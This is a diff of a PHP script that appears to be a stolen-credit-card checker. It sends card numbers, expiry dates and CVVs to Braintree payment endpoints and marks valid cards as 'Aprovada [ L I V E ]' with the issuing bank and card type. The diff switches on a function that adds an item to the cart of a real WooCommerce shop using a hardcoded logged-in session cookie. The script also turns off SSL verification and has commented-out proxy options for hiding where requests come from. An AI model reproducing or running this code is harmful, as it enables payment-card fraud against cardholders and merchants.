@@ -152,38 +152,57 @@ $dbtime = substr(str_shuffle(str_repeat("0123456789", 10)), 0, 10);
 
 
 //============================================================================================================================================================
-// function updatecart(){
+function updatecart(){
 
 
-// $ch = curl_init();
-// curl_setopt($ch, CURLOPT_URL, 'https://api.braintreegateway.com/merchants/93p3x4msyc855c6k/client_api/v1/payment_methods/credit_cards?sharedCustomerIdentifierType=undefined&braintreeLibraryVersion=braintree%2Fweb%2F2.15.7&authorizationFingerprint=eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6IkF1dGh5In0.eyJleHAiOjE1OTA1ODAzNjEsImp0aSI6IjExMTFiY2YwLWVjYTEtNGQyZC05MjMzLTUwZjFlNzBkYjJkYyIsInN1YiI6IjkzcDN4NG1zeWM4NTVjNmsiLCJpc3MiOiJBdXRoeSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjkzcDN4NG1zeWM4NTVjNmsiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwib3B0aW9ucyI6e319.cGZhpenmguwJV_VLCo3UaJxfsKGh_KUhGVHmDHTN5v4bt_XLfXAQ4CJpTvnSpSQYdmQCPQ7CTNiEP5imq2MwmA&callback=callback_json141c9a9acd194feaafdf15d52b2ee578&share=false&&creditCard%5Bnumber%5D='.$cc1.'%20'.$cc2.'%20'.$cc3.'%20'.$cc4.'&creditCard%5BexpirationMonth%5D='.$mes.'&creditCard%5BexpirationYear%5D='.$ano.'&creditCard%5Bcvv%5D='.$cvv.'&_meta%5Bintegration%5D=dropin&_meta%5Bsource%5D=form&_method=POST');
-// curl_setopt($ch, CURLOPT_HEADER, 0);
-// curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
-//    // curl_setopt($ch, CURLOPT_PROXY, $proxySocks);
-//    // curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
-// // curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
-// // curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
-// curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-// curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-// curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-// curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-// curl_setopt($ch, CURLOPT_ENCODING, "gzip, deflate, br");
-// curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
-// curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
-// curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-// 'Accept: */*',
-// 'Accept-Encoding: gzip, deflate, br',
-// 'Accept-Language: en-US,en;q=0.9',
-// 'Host: api.braintreegateway.com',
-// 'Referer: https://assets.braintreegateway.com/dropin/2.15.7/inline-frame.html',
-// 'user-agent: '.$browser.''
-// ));
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, 'https://www.farmshopaustralia.com/shop/livestock/companion-animals/1-5lt-birdpoultry-tower-drinker/');
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+   // curl_setopt($ch, CURLOPT_PROXY, $proxySocks);
+   // curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
+// curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
+// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_ENCODING, "gzip, deflate, br");
+curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
+curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
+curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+'Accept-Encoding: gzip, deflate, br',
+'Accept-Language: en-US,en;q=0.9',
+'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryu2trXQJjayDO4cu5',
+'Cookie: PHPSESSID=24h0g48mjhbh9iv37gjku3h6r6; wordpress_logged_in_3b23170009d87d5fb89275ed5e46d5db=hotshot69%7C1591713172%7CILS5ZGijYSr5Yx64BbYOi945l7y12wZYYuVjy9KNG2W%7Cac74adef1c913ff08eaf02ddcf4e8d69d2c420f90b05ec036be62ab44ab9978f; wp_woocommerce_session_3b23170009d87d5fb89275ed5e46d5db=1201%7C%7C1590676287%7C%7C1590672687%7C%7Cb800b9e989c497314608e2d30f90d8c9; mailchimp_email_id=000f9e89c1',
+'Host: www.farmshopaustralia.com',
+'Origin: https://www.farmshopaustralia.com',
+'Referer: https://www.farmshopaustralia.com/shop/livestock/companion-animals/1-5lt-birdpoultry-tower-drinker/',
+'user-agent: '.$browser.''
+));
 
-// // curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"91dd4d08-18f3-483f-b453-18a338364b24"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');
+curl_setopt($ch, CURLOPT_POSTFIELDS, '------WebKitFormBoundaryu2trXQJjayDO4cu5
+Content-Disposition: form-data; name="tm-epo-counter"
+
+1
+------WebKitFormBoundaryu2trXQJjayDO4cu5
+Content-Disposition: form-data; name="tcaddtocart"
+
+37018
+------WebKitFormBoundaryu2trXQJjayDO4cu5
+Content-Disposition: form-data; name="quantity"
+
+1
+------WebKitFormBoundaryu2trXQJjayDO4cu5
+Content-Disposition: form-data; name="add-to-cart"
+
+37018
+------WebKitFormBoundaryu2trXQJjayDO4cu5--');
 
 
-// $b_pago = curl_exec($ch);
-
+$b_pago = curl_exec($ch);
+}
 //  // echo $b_pago;
 //  $token = trim(strip_tags(getstr($b_pago,'"nonce":"','"')));
 // $issuebank = trim(strip_tags(getstr($b_pago,'"issuingBank":"','"')));
@@ -257,7 +276,7 @@ $message = trim(strip_tags(getstr($result,'"messages":"<ul class=\"woocommerce-e
 
 
 if(strpos($result,'"result":"success"')){
-      // updatecart();
+      updatecart();
 
 
        echo '<tr><td><font size="2"><font color="#FF0000">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">[ L I V E ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' | Debit : '.$debit.' | Prepaid : '.$prepaid.'</font></b></font></td></tr>';
